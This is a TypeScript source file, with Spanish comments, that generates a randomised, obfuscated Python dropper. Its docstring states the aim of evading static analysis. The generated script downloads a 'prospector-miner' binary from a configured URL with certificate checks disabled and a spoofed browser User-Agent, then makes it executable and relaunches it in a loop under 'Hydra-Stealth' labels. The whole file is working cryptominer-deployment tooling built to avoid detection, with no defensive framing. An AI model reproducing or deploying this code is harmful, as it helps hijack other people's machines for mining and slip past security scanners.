// tools/provisioner/src/lib/payload.ts
import { config } from '../config';

/**
 * Genera un payload de Python polimórfico para evadir análisis estático.
 * @param workerId - El ID único del worker para trazabilidad.
 * @returns Un string de código Python ofuscado.
 */
export function generateMinerPayload(workerId: string): string {
  // --- Motor de Ofuscación Simple ---
  const randInt = (max: number) => Math.floor(Math.random() * max);
  const randStr = (len: number) => Math.random().toString(36).substring(2, len + 2);

  // Nombres de variables y funciones aleatorios para cada inyección
  const fn_log = `log_${randStr(5)}`;
  const fn_download = `download_${randStr(5)}`;
  const fn_main_loop = `run_sequence_${randStr(5)}`;
  const var_binary_url = `URL_${randStr(4)}`;
  const var_orch_url = `API_ENDPOINT_${randStr(4)}`;
  const var_token = `AUTH_KEY_${randStr(4)}`;
  const var_worker_id = `NODE_ID_${randStr(4)}`;
  const var_bin_name = `EXECUTABLE_NAME_${randStr(4)}`;

  // Comentarios aleatorios para alterar la estructura del archivo
  const random_comments = [
    `# Polimorphic Layer: ID ${randInt(99999)}`,
    `# Timestamp: ${new Date().toISOString()}`,
    `# Node Signature: ${randStr(12)}`,
    `# System Checksum: ${randInt(1_000_000)}`,
  ];

  // Python Supervisor V6: Hydra-Stealth Edition
  return `
# =======================================================
# HYDRA NODE SUPERVISOR v6.1 - DYNAMIC PAYLOAD
# ${random_comments.join('\n# ')}
# =======================================================
import os
import subprocess
import time
import sys
import random
import urllib.request
import ssl
import signal
import platform

# --- DYNAMIC CONFIGURATION ---
${var_binary_url} = "${config.MINER_BINARY_URL}"
${var_orch_url} = "${config.ORCHESTRATOR_URL}"
${var_token} = "${config.WORKER_AUTH_TOKEN}"
${var_worker_id} = "${workerId}"
${var_bin_name} = "prospector-miner"

# --- STEALTH LOGGING ---
def ${fn_log}(msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] [HYDRA:{${var_worker_id}}] {msg}", flush=True)

# --- NETWORK STEALTH & RESILIENCE ---
def ${fn_download}():
    # ${random_comments[1]}
    retry_count = 0
    max_retries = 5
    while retry_count < max_retries:
        try:
            ${fn_log}(f"⬇️ Acquiring payload... (Attempt {retry_count+1})")
            ctx = ssl._create_unverified_context()
            req = urllib.request.Request(
                ${var_binary_url},
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'}
            )
            with urllib.request.urlopen(req, context=ctx, timeout=60) as response, open(${var_bin_name}, 'wb') as out_file:
                out_file.write(response.read())
            os.chmod(${var_bin_name}, 0o755)
            size_mb = os.path.getsize(${var_bin_name}) / (1024 * 1024)
            if size_mb < 1.0: raise Exception("Payload integrity fail.")
            ${fn_log}(f"✅ Payload secured. Size: {size_mb:.2f} MB")
            return True
        except Exception as e:
            ${fn_log}(f"❌ Download error: {e}")
            retry_count += 1
            time.sleep(random.randint(2, 10))
    return False

def signal_handler(sig, frame):
    ${fn_log}("🛑 Termination signal received. Halting operations.")
    sys.exit(0)

# --- MAIN EXECUTION SEQUENCE ---
def ${fn_main_loop}():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if not ${fn_download}():
        ${fn_log}("💀 FATAL: Payload acquisition failed. Aborting.")
        return

    cmd = [
        f"./{${var_bin_name}}",
        f"--orchestrator-url={${var_orch_url}}",
        f"--auth-token={${var_token}}",
        f"--worker-id={${var_worker_id}}"
    ]
    backoff = 2
    while True:
        ${fn_log}(f"🚀 Igniting Miner Sequence... (Backoff: {backoff}s)")
        process = None
        try:
            # ${random_comments[2]}
            process = subprocess.Popen(cmd, stdout=sys.stdout, stderr=sys.stderr)
            rc = process.wait()
            if rc == 0:
                ${fn_log}("🏁 Sequence finished gracefully.")
                break
            else:
                ${fn_log}(f"⚠️ Sequence crashed (Code: {rc}). Restarting...")
            time.sleep(backoff)
            backoff = min(backoff * 2, 60) # Exponential backoff
        except Exception as e:
            ${fn_log}(f"💀 Supervisor Exception: {e}")
            time.sleep(10)
        finally:
            if process and process.poll() is None:
                process.kill()

if __name__ == "__main__":
    print("--- HYDRA NODE INITIALIZATION v6.1 ---")
    ${fn_main_loop}()
`;
}
